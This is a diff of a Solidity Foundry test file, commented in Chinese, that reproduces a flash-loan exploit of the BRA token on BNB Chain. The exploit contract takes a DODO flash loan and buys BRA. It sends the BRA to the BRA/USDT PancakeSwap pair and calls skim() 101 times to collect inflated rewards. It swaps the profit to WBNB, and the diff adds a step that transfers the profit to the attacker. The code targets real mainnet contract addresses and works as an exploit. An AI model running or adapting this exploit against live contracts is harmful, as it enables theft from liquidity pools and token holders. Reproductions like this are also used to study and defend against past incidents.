@@ -41,34 +41,24 @@ contract Attacker is Test {
 
     // 发起攻击
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "[Before Attacks] Attacker WBNB balance",
-            wbnb.balanceOf(address(this)),
-            18
-        );
+        // 记录攻击前Attacker的WBNB余额
+        emit log_named_decimal_uint("[Before Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
         exploit.go();
-        // 攻击完结果WBNB数量打印出来也为0,是因为已经被攻击过了,按现在的汇率算出来就是0了
-        // 主要看BRA数量是不是上去了
-        emit log_named_decimal_uint(
-            "[After Attacks] Attacker WBNB balance",
-            wbnb.balanceOf(address(this)),
-            18
-        );
+        // 记录攻击后Attacker的WBNB余额
+        emit log_named_decimal_uint("[After Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
     }
 }
 
 // 攻击逻辑合约
 contract Exploit is Test {
     // 闪电贷合约
-    IDPPAdvanced constant dppAdvanced =
-        IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
+    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
     WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IUSDT constant usdt = IUSDT(0x55d398326f99059fF775485246999027B3197955);
     IERC20 constant bra = IERC20(0x449FEA37d339a11EfE1B181e5D5462464bBa3752);
     // Dex: PancakeSwap Router
     // 具体合约查看: https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e
-    IPancakeRouter constant pancakeRouter =
-        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     address BRA_USDT_Pair = 0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E;
 
@@ -77,15 +67,17 @@ contract Exploit is Test {
         uint256 baseAmount = 1400 * 1e18;
         address assetTo = address(this);
         bytes memory data = "xxas";
+        // 借入闪电贷,执行回调函数
         dppAdvanced.flashLoan(baseAmount, 0, assetTo, data);
+
+        console.log("Step3. Send back the profit to attacker");
+        uint256 profit = wbnb.balanceOf(address(this));
+        // 将此攻击逻辑合约攻击得到的WBNB转移给Attacker账户地址
+        require(wbnb.transfer(msg.sender, profit), "transfer failed");
     }
 
-    function DPPFlashLoanCall(
-        address,
-        uint256 baseAmount,
-        uint256,
-        bytes memory
-    ) external {
+    // 闪电贷回调函数
+    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes memory) external {
         console.log("Step2. Flashloan attacks");
 
         address[] memory swapPath = new address[](3);
@@ -99,42 +91,23 @@ contract Exploit is Test {
         swapPath[2] = address(bra);
 
         // 将BNB兑换为RBA
-        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(
-            1,
-            swapPath,
-            address(this),
-            block.timestamp
-        );
+        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(1, swapPath, address(this), block.timestamp);
 
         uint256 pairBalanceBefore = bra.balanceOf(BRA_USDT_Pair);
         uint256 sendAmount = bra.balanceOf(address(this));
 
-        console.log(
-            "Init Exploit: transfer all BRA to Pair for earning double reward"
-        );
-        emit log_named_decimal_uint(
-            "[Before Exp] Pair contract BRA balance",
-            pairBalanceBefore,
-            18
-        );
-        emit log_named_decimal_uint(
-            "[Before Exp] Exploit contract BRA balance",
-            sendAmount,
-            18
-        );
+        console.log("Init Exploit: transfer all BRA to Pair for earning double reward");
+        emit log_named_decimal_uint("[Before Exp] Pair contract BRA balance", pairBalanceBefore, 18);
+        emit log_named_decimal_uint("[Before Exp] Exploit contract BRA balance", sendAmount, 18);
         bra.transfer(BRA_USDT_Pair, sendAmount);
 
         console.log("Start Exploit: skim() to earn");
-        for (uint i = 0; i < 101; ++i) {
+        for (uint256 i = 0; i < 101; ++i) {
             IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
         }
 
         uint256 pairBalanceAfter = bra.balanceOf(BRA_USDT_Pair);
-        emit log_named_decimal_uint(
-            "[After Exp] Pair contract BRA balance",
-            pairBalanceAfter,
-            18
-        );
+        emit log_named_decimal_uint("[After Exp] Pair contract BRA balance", pairBalanceAfter, 18);
 
         console.log("Swap BRA (profit) to USDT");
         address[] memory inputSwapPath = new address[](2);
@@ -142,10 +115,7 @@ contract Exploit is Test {
         inputSwapPath[0] = address(bra);
         inputSwapPath[1] = address(usdt);
         // 计算将兑换的USDT数量
-        outputSwapAmounts = pancakeRouter.getAmountsOut(
-            pairBalanceAfter - pairBalanceBefore,
-            inputSwapPath
-        );
+        outputSwapAmounts = pancakeRouter.getAmountsOut(pairBalanceAfter - pairBalanceBefore, inputSwapPath);
         uint256 usdtAmount = outputSwapAmounts[1];
         // 将套利取得的BRA兑换为USDT
         IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), "");
@@ -156,13 +126,7 @@ contract Exploit is Test {
         inputSwapPath[1] = address(wbnb);
 
         // 将USDT兑换为WBNB
-        pancakeRouter.swapExactTokensForETH(
-            usdtAmount,
-            1,
-            inputSwapPath,
-            address(this),
-            block.timestamp
-        );
+        pancakeRouter.swapExactTokensForETH(usdtAmount, 1, inputSwapPath, address(this), block.timestamp);
 
         // 检查成功套利
         assert(address(this).balance > baseAmount);
@@ -178,31 +142,15 @@ contract Exploit is Test {
 }
 
 /*---------- Interface ----------*/
-// 闪电贷借口
+// 闪电贷接口
 interface IDPPAdvanced {
-    event DODOFlashLoan(
-        address borrower,
-        address assetTo,
-        uint256 baseAmount,
-        uint256 quoteAmount
-    );
+    event DODOFlashLoan(address borrower, address assetTo, uint256 baseAmount, uint256 quoteAmount);
     event DODOSwap(
-        address fromToken,
-        address toToken,
-        uint256 fromAmount,
-        uint256 toAmount,
-        address trader,
-        address receiver
+        address fromToken, address toToken, uint256 fromAmount, uint256 toAmount, address trader, address receiver
     );
     event LpFeeRateChange(uint256 newLpFeeRate);
-    event OwnershipTransferPrepared(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
+    event OwnershipTransferPrepared(address indexed previousOwner, address indexed newOwner);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event RChange(uint8 newRState);
 
     struct PMMState {
@@ -251,12 +199,7 @@ interface IDPPAdvanced {
 
     function claimOwnership() external;
 
-    function flashLoan(
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        address assetTo,
-        bytes memory data
-    ) external;
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;
 
     function getBaseInput() external view returns (uint256 input);
 
@@ -267,26 +210,13 @@ interface IDPPAdvanced {
     function getPMMStateForCall()
         external
         view
-        returns (
-            uint256 i,
-            uint256 K,
-            uint256 B,
-            uint256 Q,
-            uint256 B0,
-            uint256 Q0,
-            uint256 R
-        );
+        returns (uint256 i, uint256 K, uint256 B, uint256 Q, uint256 B0, uint256 Q0, uint256 R);
 
     function getQuoteInput() external view returns (uint256 input);
 
-    function getUserFeeRate(
-        address user
-    ) external view returns (uint256 lpFeeRate, uint256 mtFeeRate);
+    function getUserFeeRate(address user) external view returns (uint256 lpFeeRate, uint256 mtFeeRate);
 
-    function getVaultReserve()
-        external
-        view
-        returns (uint256 baseReserve, uint256 quoteReserve);
+    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
 
     function init(
         address owner,
@@ -302,31 +232,15 @@ interface IDPPAdvanced {
 
     function initOwner(address newOwner) external;
 
-    function querySellBase(
-        address trader,
-        uint256 payBaseAmount
-    )
+    function querySellBase(address trader, uint256 payBaseAmount)
         external
         view
-        returns (
-            uint256 receiveQuoteAmount,
-            uint256 mtFee,
-            uint8 newRState,
-            uint256 newBaseTarget
-        );
+        returns (uint256 receiveQuoteAmount, uint256 mtFee, uint8 newRState, uint256 newBaseTarget);
 
-    function querySellQuote(
-        address trader,
-        uint256 payQuoteAmount
-    )
+    function querySellQuote(address trader, uint256 payQuoteAmount)
         external
         view
-        returns (
-            uint256 receiveBaseAmount,
-            uint256 mtFee,
-            uint8 newRState,
-            uint256 newQuoteTarget
-        );
+        returns (uint256 receiveBaseAmount, uint256 mtFee, uint8 newRState, uint256 newQuoteTarget);
 
     function ratioSync() external;
 
@@ -357,11 +271,7 @@ interface IDPPAdvanced {
         uint256 minQuoteReserve
     ) external returns (bool);
 
-    function tunePrice(
-        uint256 newI,
-        uint256 minBaseReserve,
-        uint256 minQuoteReserve
-    ) external returns (bool);
+    function tunePrice(uint256 newI, uint256 minBaseReserve, uint256 minQuoteReserve) external returns (bool);
 
     function version() external pure returns (string memory);
 }
